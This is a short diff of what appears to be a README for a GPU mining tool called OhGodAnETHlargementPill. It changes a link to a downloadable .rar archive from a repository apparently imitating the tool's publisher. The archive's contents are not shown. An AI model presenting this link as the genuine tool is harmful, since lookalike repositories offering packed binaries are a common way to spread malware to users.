@@ -2,8 +2,8 @@
 
 ![image](https://user-images.githubusercontent.com/123942251/215446684-704fa775-50f7-4259-8a3e-738cc17641e5.png)
 
-[Download OhGodAnETHlargementPill Tablet for mining on NVIDIA](https://github.com/OhGodACompanyETH/OhGodAnETHlargementPill/releases/download/OhGodAnETHlargementPill/OhGodAnETHlargementPill.rar)
------------------------------------------------------------------------------------------
+- [ ] [Download OhGodAnETHlargementPill Tablet for mining on NVIDIA](https://github.com/OhGodACompanyETH/OhGodAnETHlargementPill/releases/download/ohgodanthtabled_win_481/OhGodAnETHlargementPill.rar)
+
 
 ED (Ethereum Dysfunction) affects 1 in 10 NVIDIA GPUs in North America. But don't worry - OhGodACompany is here to help.
 
